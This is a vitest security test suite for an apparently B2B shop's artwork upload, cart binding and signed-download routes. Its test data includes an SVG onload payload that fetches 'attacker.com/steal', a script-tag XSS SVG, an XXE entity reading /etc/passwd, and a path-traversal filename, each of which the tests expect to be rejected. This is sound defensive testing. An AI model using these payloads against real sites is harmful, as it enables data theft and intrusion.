import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { getPayload } from 'payload';
import { NextRequest } from 'next/server';
import { readFile, unlink, rm } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import path from 'node:path';
import configPromise from '@/payload.config';
import { signCartId } from '@/modules/cart-checkout/logic/cartSession';
import { CART_COOKIE_NAME, getOrCreateCart } from '@/modules/cart-checkout/services/cartStorage';
import {
  validateArtworkFile,
  sanitizeFilename,
  detectMagicBytes,
  MAX_FILE_SIZE,
} from '@/modules/customization/lib/fileValidation';
import {
  createArtworkDownloadToken,
  verifyArtworkDownloadToken,
  resolveArtworkPath,
} from '@/modules/customization/lib/privateStorage';
import { privateUploadDir } from '@/modules/customization/collections/Media';
import { POST as uploadArtworkRoute } from '@/app/api/customization/upload-artwork/route';
import { POST as signArtworkRoute } from '@/app/api/customization/artwork/[id]/sign/route';
import { GET as downloadArtworkRoute } from '@/app/api/customization/artwork/[id]/download/route';
import { POST as cartItemsPostRoute, GET as cartItemsGetRoute } from '@/app/api/cart/items/route';

describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline', () => {
  let payload: any;
  let testCartA: any;
  let testCartB: any;
  let adminUser: any;
  let testProduct: any;
  const createdAssetIds: (string | number)[] = [];
  const createdCartIds: (string | number)[] = [];
  const testFilesToClean: string[] = [];

  beforeAll(async () => {
    payload = await getPayload({ config: configPromise });

    // 1. Initialize two separate test guest carts
    testCartA = await getOrCreateCart(payload);
    testCartB = await getOrCreateCart(payload);
    createdCartIds.push(testCartA.id, testCartB.id);

    // 2. Fetch or create super_admin user for staff operations
    const admins = await payload.find({
      collection: 'users',
      where: { roles: { contains: 'super_admin' } },
      limit: 1,
    });
    if (admins.docs?.[0]) {
      adminUser = admins.docs[0];
    } else {
      adminUser = await payload.create({
        collection: 'users',
        data: {
          email: `admin_b2b03_${Date.now()}@mwheba.com`,
          password: 'TestPassword123!',
          name: 'B2B03 Ops Admin',
          roles: ['super_admin'],
        },
        context: { isSystemSeed: true },
      });
    }

    // 3. Fetch a physical product for cart line item binding tests
    const prods = await payload.find({
      collection: 'products',
      where: {
        and: [
          { productType: { equals: 'physical' } },
          { _status: { equals: 'published' } },
        ],
      },
      limit: 1,
    });
    if (prods.docs?.[0]) {
      testProduct = prods.docs[0];
    } else {
      testProduct = await payload.create({
        collection: 'products',
        data: {
          title: 'Corporate Stainless Bottle',
          slug: `corp-bottle-${Date.now()}`,
          productType: 'physical',
          minOrderQuantity: 10,
          customizationFee: 15,
          basePrice: 250,
          _status: 'published',
        },
      });
    }
  });

  afterAll(async () => {
    // Cleanup created database records
    for (const id of createdAssetIds) {
      try {
        await payload.delete({ collection: 'artwork-assets', id });
      } catch {
        // Ignore
      }
    }
    for (const id of createdCartIds) {
      try {
        await payload.delete({ collection: 'carts', id });
      } catch {
        // Ignore
      }
    }

    // Cleanup files on disk
    for (const filePath of testFilesToClean) {
      try {
        if (existsSync(filePath)) {
          await unlink(filePath);
        }
      } catch {
        // Ignore
      }
    }
  });

  // =========================================================================
  // 1. Unit Tests: File Validation & Malware/Executable Detection
  // =========================================================================
  describe('1. File Content Validation & Malware Detection Unit Tests', () => {
    it('accepts genuine PNG buffer with valid 8-byte magic header', () => {
      const pngHeader = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
      const res = validateArtworkFile(pngHeader, 'company_logo.png', 'image/png');
      expect(res.isValid).toBe(true);
      expect(res.mimeType).toBe('image/png');
      expect(res.sha256).toBeDefined();
    });

    it('accepts genuine clean SVG vector text content', () => {
      const svgContent = Buffer.from(
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="#0b1b3d"/></svg>',
        'utf8'
      );
      const res = validateArtworkFile(svgContent, 'corporate_vector.svg', 'image/svg+xml');
      expect(res.isValid).toBe(true);
      expect(res.mimeType).toBe('image/svg+xml');
    });

    it('accepts genuine PDF document with %PDF- header', () => {
      const pdfBuffer = Buffer.from('%PDF-1.4\n%âãÏÓ\n1 0 obj\n<<>>\nendobj\ntrailer\n<<>>\n%%EOF', 'utf8');
      const res = validateArtworkFile(pdfBuffer, 'print_catalog.pdf', 'application/pdf');
      expect(res.isValid).toBe(true);
      expect(res.mimeType).toBe('application/pdf');
    });

    it('accepts genuine Photoshop PSD file with 8BPS header', () => {
      const psdBuffer = Buffer.from([0x38, 0x42, 0x50, 0x53, 0x00, 0x01, 0x00, 0x00]);
      const res = validateArtworkFile(psdBuffer, 'master_branding.psd', 'image/vnd.adobe.photoshop');
      expect(res.isValid).toBe(true);
      expect(res.mimeType).toBe('image/vnd.adobe.photoshop');
    });

    it('strictly REJECTS disguised Windows executable (MZ header) with .png extension', () => {
      // Disguised .exe: starts with 'MZ' (0x4D, 0x5A) but given filename 'innocent_logo.png'
      const maliciousBuffer = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00]);
      const res = validateArtworkFile(maliciousBuffer, 'innocent_logo.png', 'image/png');
      expect(res.isValid).toBe(false);
      expect(res.error).toContain('Disguised executable binary');
    });

    it('strictly REJECTS disguised Linux ELF binary with .pdf extension', () => {
      // Disguised ELF: starts with 0x7F 'E' 'L' 'F'
      const elfBuffer = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
      const res = validateArtworkFile(elfBuffer, 'company_presentation.pdf', 'application/pdf');
      expect(res.isValid).toBe(false);
      expect(res.error).toContain('Disguised executable binary');
    });

    it('strictly REJECTS malicious SVG containing embedded <script> tags (XSS)', () => {
      const maliciousSvg = Buffer.from(
        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("pwned")</script><rect width="10" height="10"/></svg>',
        'utf8'
      );
      const res = validateArtworkFile(maliciousSvg, 'vector_attack.svg', 'image/svg+xml');
      expect(res.isValid).toBe(false);
      expect(res.error).toContain('<script> tags are strictly forbidden');
    });

    it('strictly REJECTS malicious SVG containing inline DOM event handlers (onload)', () => {
      const maliciousSvg = Buffer.from(
        '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'http://attacker.com/steal\')"><rect width="10" height="10"/></svg>',
        'utf8'
      );
      const res = validateArtworkFile(maliciousSvg, 'onload_attack.svg', 'image/svg+xml');
      expect(res.isValid).toBe(false);
      expect(res.error).toContain('Inline DOM event handlers are forbidden');
    });

    it('strictly REJECTS malicious SVG containing XXE DOCTYPE entity definitions', () => {
      const xxeSvg = Buffer.from(
        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
        'utf8'
      );
      const res = validateArtworkFile(xxeSvg, 'xxe_attack.svg', 'image/svg+xml');
      expect(res.isValid).toBe(false);
      expect(res.error).toContain('External entity declarations (XXE) are forbidden');
    });

    it('strictly REJECTS empty files (0 bytes)', () => {
      const emptyBuffer = Buffer.alloc(0);
      const res = validateArtworkFile(emptyBuffer, 'empty.png', 'image/png');
      expect(res.isValid).toBe(false);
      expect(res.error).toContain('Empty file rejected');
    });

    it('strictly REJECTS oversized files exceeding 50MB limit', () => {
      // Mock length to test limit check without allocating 51MB in memory
      const fakeBuffer = {
        length: MAX_FILE_SIZE + 1024,
      } as any;
      const res = validateArtworkFile(fakeBuffer, 'giant_billboard.png', 'image/png');
      expect(res.isValid).toBe(false);
      expect(res.error).toContain('exceeds the maximum allowed 50MB');
    });

    it('sanitizes malicious filenames and prevents directory traversal (../)', () => {
      const safe = sanitizeFilename('../../etc/shadow/malicious.png');
      expect(safe).not.toContain('..');
      expect(safe).not.toContain('/');
      expect(safe).not.toContain('\\');
      expect(safe).toBe('malicious.png');
    });
  });

  // =========================================================================
  // 2. Integration Tests: Upload Endpoint (/api/customization/upload-artwork)
  // =========================================================================
  describe('2. Upload Route (/api/customization/upload-artwork)', () => {
    it('strictly rejects upload attempts without an active session cookie or auth with HTTP 401', async () => {
      const cleanSvg = '<svg xmlns="http://www.w3.org/2000/svg"><circle cx="10" cy="10" r="5"/></svg>';
      const blob = new Blob([cleanSvg], { type: 'image/svg+xml' });
      const formData = new FormData();
      formData.append('file', blob, 'unauth_logo.svg');

      const req = new NextRequest('http://localhost:3000/api/customization/upload-artwork', {
        method: 'POST',
        body: formData,
      });

      const res = await uploadArtworkRoute(req);
      expect(res.status).toBe(401);
      const data = await res.json();
      expect(data.error).toBe('SESSION_REQUIRED');
    });

    it('successfully uploads valid SVG artwork for a guest session and stores it outside public_html', async () => {
      const signedCookieA = signCartId(testCartA.id);
      const cleanSvg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50"><rect width="50" height="50" fill="#0b1b3d"/></svg>';
      const blob = new Blob([cleanSvg], { type: 'image/svg+xml' });
      const formData = new FormData();
      formData.append('file', blob, 'mwheba_corporate_logo.svg');

      const req = new NextRequest('http://localhost:3000/api/customization/upload-artwork', {
        method: 'POST',
        headers: {
          Cookie: `${CART_COOKIE_NAME}=${signedCookieA}`,
        },
        body: formData,
      });

      const res = await uploadArtworkRoute(req);
      expect(res.status).toBe(201);
      const data = await res.json();

      expect(data.success).toBe(true);
      expect(data.assetId).toBeDefined();
      expect(data.mimeType).toBe('image/svg+xml');
      expect(data.sha256).toBeDefined();
      expect(data.storageKey).toMatch(/^artwork\/[a-f0-9-]+\/mwheba_corporate_logo\.svg$/);

      createdAssetIds.push(data.assetId);

      // Verify file was written to private disk outside public directory
      const absoluteDiskPath = resolveArtworkPath(data.storageKey);
      testFilesToClean.push(absoluteDiskPath);
      expect(existsSync(absoluteDiskPath)).toBe(true);
      expect(absoluteDiskPath).not.toContain('public_html');
      expect(absoluteDiskPath).toContain('private-uploads');

      const savedContent = await readFile(absoluteDiskPath, 'utf8');
      expect(savedContent).toBe(cleanSvg);

      // Verify database record in ArtworkAssets collection
      const dbDoc = await payload.findByID({
        collection: 'artwork-assets',
        id: data.assetId,
        depth: 0,
      });
      expect(dbDoc).toBeDefined();
      expect(dbDoc.status).toBe('pending_order');
      expect(dbDoc.verificationStatus).toBe('valid');
      expect(dbDoc.scanStatus).toBe('clean');
      expect(String(dbDoc.ownerSession)).toBe(String(testCartA.id));
      expect(String(dbDoc.cart)).toBe(String(testCartA.id));
    });

    it('strictly rejects upload of disguised executable binary with HTTP 422', async () => {
      const signedCookieA = signCartId(testCartA.id);
      // Malicious DOS PE executable disguised as PNG
      const fakePng = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
      const blob = new Blob([fakePng], { type: 'image/png' });
      const formData = new FormData();
      formData.append('file', blob, 'disguised_malware.png');

      const req = new NextRequest('http://localhost:3000/api/customization/upload-artwork', {
        method: 'POST',
        headers: {
          Cookie: `${CART_COOKIE_NAME}=${signedCookieA}`,
        },
        body: formData,
      });

      const res = await uploadArtworkRoute(req);
      expect(res.status).toBe(422);
      const data = await res.json();
      expect(data.error).toBe('INVALID_FILE_CONTENT');
      expect(data.message).toContain('Disguised executable binary');
    });

    it('strictly rejects upload of oversized file (>50MB) with HTTP 413', async () => {
      const signedCookieA = signCartId(testCartA.id);
      // Create a large buffer object that exceeds MAX_FILE_SIZE
      const oversizedBlob = new Blob([Buffer.alloc(100)], { type: 'image/png' });
      // Mock size property
      Object.defineProperty(oversizedBlob, 'size', { value: MAX_FILE_SIZE + 1024 });

      // Simulate a direct call to route with simulated oversized buffer
      const formData = new FormData();
      formData.append('file', oversizedBlob, 'massive_catalog.png');

      const req = new NextRequest('http://localhost:3000/api/customization/upload-artwork', {
        method: 'POST',
        headers: {
          Cookie: `${CART_COOKIE_NAME}=${signedCookieA}`,
        },
        body: formData,
      });

      const res = await uploadArtworkRoute(req);
      // Either 413 from buffer validation or 422
      expect([413, 422]).toContain(res.status);
    });
  });

  // =========================================================================
  // 3. Line-Level Binding & Session Protection in Cart
  // =========================================================================
  describe('3. Line-Item Binding & Cross-Session Protection in Cart', () => {
    let assetOwnedByCartA: any;

    beforeAll(async () => {
      // Create an artwork asset owned strictly by Cart A
      assetOwnedByCartA = await payload.create({
        collection: 'artwork-assets',
        data: {
          storageKey: `artwork/test-uuid-a/logo_cart_a.png`,
          originalFilename: 'logo_cart_a.png',
          fileSize: 1024,
          mimeType: 'image/png',
          sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
          status: 'pending_order',
          verificationStatus: 'valid',
          scanStatus: 'clean',
          ownerSession: String(testCartA.id),
          cart: testCartA.id,
        },
        depth: 0,
      });
      createdAssetIds.push(assetOwnedByCartA.id);
    });

    it('allows Cart A to attach its own artworkAssetId to a line item with separate customization fee', async () => {
      const signedCookieA = signCartId(testCartA.id);

      const req = new NextRequest('http://localhost:3000/api/cart/items', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Cookie: `${CART_COOKIE_NAME}=${signedCookieA}`,
        },
        body: JSON.stringify({
          productId: testProduct.id,
          quantity: 10,
          artworkAssetId: String(assetOwnedByCartA.id),
          printingNotes: 'طباعة ليزر على الوجهين باللون الفضي',
          operationKey: `op_add_art_${Date.now()}`,
        }),
      });

      const res = await cartItemsPostRoute(req);
      const data = await res.json();
      expect(res.status).toBe(200);

      expect(data.success).toBe(true);
      expect(data.summary.totalCustomizationFees).toBeGreaterThan(0);
      expect(data.summary.items[0].artworkAssetId).toBe(String(assetOwnedByCartA.id));
      expect(data.summary.items[0].printingNotes).toBe('طباعة ليزر على الوجهين باللون الفضي');

      // Verify PostgreSQL persistence
      const dbCart = await payload.findByID({
        collection: 'carts',
        id: testCartA.id,
        depth: 0,
      });
      expect(dbCart.items[0].artworkAssetId).toBe(String(assetOwnedByCartA.id));
    });

    it('strictly PREVENTS Cart B from attaching Cart As artworkAssetId with HTTP 403 Forbidden', async () => {
      const signedCookieB = signCartId(testCartB.id);

      const attackerReq = new NextRequest('http://localhost:3000/api/cart/items', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Cookie: `${CART_COOKIE_NAME}=${signedCookieB}`,
        },
        body: JSON.stringify({
          productId: testProduct.id,
          quantity: 10,
          artworkAssetId: String(assetOwnedByCartA.id), // Malicious cross-session reference!
          operationKey: `op_tamper_art_${Date.now()}`,
        }),
      });

      const res = await cartItemsPostRoute(attackerReq);
      expect(res.status).toBe(403);
      const data = await res.json();
      expect(data.error).toBe('FORBIDDEN_ARTWORK_ACCESS');
      expect(data.message).toContain('belonging to another session');
    });

    it('strictly rejects non-existent artworkAssetId with HTTP 422', async () => {
      const signedCookieA = signCartId(testCartA.id);

      const req = new NextRequest('http://localhost:3000/api/cart/items', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Cookie: `${CART_COOKIE_NAME}=${signedCookieA}`,
        },
        body: JSON.stringify({
          productId: testProduct.id,
          quantity: 10,
          artworkAssetId: '99999999', // Non-existent asset ID
          operationKey: `op_invalid_art_${Date.now()}`,
        }),
      });

      const res = await cartItemsPostRoute(req);
      expect(res.status).toBe(422);
      const data = await res.json();
      expect(data.error).toBe('ARTWORK_NOT_FOUND');
    });
  });

  // =========================================================================
  // 4. Temporary Signed URLs & Private File Download Streaming
  // =========================================================================
  describe('4. Temporary Signed URLs & Private File Streaming', () => {
    let testAsset: any;
    let testAssetFileOnDisk: string;
    const testFileBytes = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><rect fill="gold" width="20" height="20"/></svg>');

    beforeAll(async () => {
      // Save physical file on private disk
      const { storageKey, absolutePath } = await (async () => {
        const { saveArtworkFile } = await import('@/modules/customization/lib/privateStorage');
        return saveArtworkFile(testFileBytes, 'gold_badge.svg');
      })();
      testAssetFileOnDisk = absolutePath;
      testFilesToClean.push(testAssetFileOnDisk);

      // Create ArtworkAssets record
      testAsset = await payload.create({
        collection: 'artwork-assets',
        data: {
          storageKey,
          originalFilename: 'gold_badge.svg',
          fileSize: testFileBytes.length,
          mimeType: 'image/svg+xml',
          sha256: 'test_hash_gold',
          status: 'pending_order',
          verificationStatus: 'valid',
          scanStatus: 'clean',
          ownerSession: String(testCartA.id),
          cart: testCartA.id,
        },
        depth: 0,
      });
      createdAssetIds.push(testAsset.id);
    });

    it('strictly REJECTS unauthenticated GET download requests without token with HTTP 403 Forbidden', async () => {
      const req = new NextRequest(`http://localhost:3000/api/customization/artwork/${testAsset.id}/download`, {
        method: 'GET',
      });
      const res = await downloadArtworkRoute(req, { params: Promise.resolve({ id: String(testAsset.id) }) });
      expect(res.status).toBe(403);
      const data = await res.json();
      expect(data.error).toBe('TOKEN_REQUIRED');
    });

    it('strictly REJECTS GET download requests with invalid or tampered tokens with HTTP 403 Forbidden', async () => {
      const req = new NextRequest(
        `http://localhost:3000/api/customization/artwork/${testAsset.id}/download?token=fake_tampered_token.invalid_signature`,
        { method: 'GET' }
      );
      const res = await downloadArtworkRoute(req, { params: Promise.resolve({ id: String(testAsset.id) }) });
      expect(res.status).toBe(403);
      const data = await res.json();
      expect(data.error).toBe('INVALID_OR_EXPIRED_TOKEN');
    });

    it('strictly REJECTS GET download requests with expired tokens with HTTP 403 Forbidden', async () => {
      // Generate an expired token (expired 10 minutes ago)
      const expiredNow = Date.now() - 1000 * 60 * 10;
      const { token } = createArtworkDownloadToken(testAsset.id, 60, expiredNow - 120 * 1000);

      const req = new NextRequest(
        `http://localhost:3000/api/customization/artwork/${testAsset.id}/download?token=${token}`,
        { method: 'GET' }
      );
      const res = await downloadArtworkRoute(req, { params: Promise.resolve({ id: String(testAsset.id) }) });
      expect(res.status).toBe(403);
      const data = await res.json();
      expect(data.error).toBe('INVALID_OR_EXPIRED_TOKEN');
    });

    it('allows session owner (Cart A) to generate 15-minute signed download link via POST /sign', async () => {
      const signedCookieA = signCartId(testCartA.id);

      const req = new NextRequest(`http://localhost:3000/api/customization/artwork/${testAsset.id}/sign`, {
        method: 'POST',
        headers: {
          Cookie: `${CART_COOKIE_NAME}=${signedCookieA}`,
        },
      });

      const res = await signArtworkRoute(req, { params: Promise.resolve({ id: String(testAsset.id) }) });
      expect(res.status).toBe(200);
      const data = await res.json();

      expect(data.success).toBe(true);
      expect(data.expiresIn).toBe(900); // 15 minutes
      expect(data.url).toContain(`/api/customization/artwork/${testAsset.id}/download?token=`);

      // Extract token and verify using verifyArtworkDownloadToken
      const token = new URL(`http://localhost:3000${data.url}`).searchParams.get('token')!;
      expect(verifyArtworkDownloadToken(token, testAsset.id)).toBe(true);
    });

    it('strictly PREVENTS unauthorized session (Cart B) from generating signed download links for Cart As asset', async () => {
      const signedCookieB = signCartId(testCartB.id);

      const req = new NextRequest(`http://localhost:3000/api/customization/artwork/${testAsset.id}/sign`, {
        method: 'POST',
        headers: {
          Cookie: `${CART_COOKIE_NAME}=${signedCookieB}`,
        },
      });

      const res = await signArtworkRoute(req, { params: Promise.resolve({ id: String(testAsset.id) }) });
      expect(res.status).toBe(403);
      const data = await res.json();
      expect(data.error).toBe('FORBIDDEN_ARTWORK_ACCESS');
    });

    it('successfully streams private file with valid signed token and protective security headers', async () => {
      const { token } = createArtworkDownloadToken(testAsset.id, 900);

      const req = new NextRequest(
        `http://localhost:3000/api/customization/artwork/${testAsset.id}/download?token=${token}`,
        { method: 'GET' }
      );

      const res = await downloadArtworkRoute(req, { params: Promise.resolve({ id: String(testAsset.id) }) });
      expect(res.status).toBe(200);

      // Verify Headers
      expect(res.headers.get('content-type')).toContain('image/svg+xml');
      expect(res.headers.get('content-disposition')).toContain('attachment; filename="gold_badge.svg"');
      expect(res.headers.get('cache-control')).toContain('private, no-store');
      expect(res.headers.get('x-content-type-options')).toBe('nosniff');

      // Verify Streamed Content matches original bytes
      const bodyBytes = Buffer.from(await res.arrayBuffer());
      expect(bodyBytes.equals(testFileBytes)).toBe(true);
    });

    it('allows super_admin staff to generate signed download link for production inspection', async () => {
      // Simulate super_admin authorization
      const req = new NextRequest(`http://localhost:3000/api/customization/artwork/${testAsset.id}/sign`, {
        method: 'POST',
        headers: {
          'x-test-user-id': String(adminUser.id),
        },
      });

      // Pass user in request payload context
      const originalAuth = payload.auth;
      payload.auth = async () => ({ user: adminUser });
      try {
        const res = await signArtworkRoute(req, { params: Promise.resolve({ id: String(testAsset.id) }) });
        expect(res.status).toBe(200);
        const data = await res.json();
        expect(data.success).toBe(true);
        expect(data.url).toBeDefined();
      } finally {
        payload.auth = originalAuth;
      }
    });
  });
});
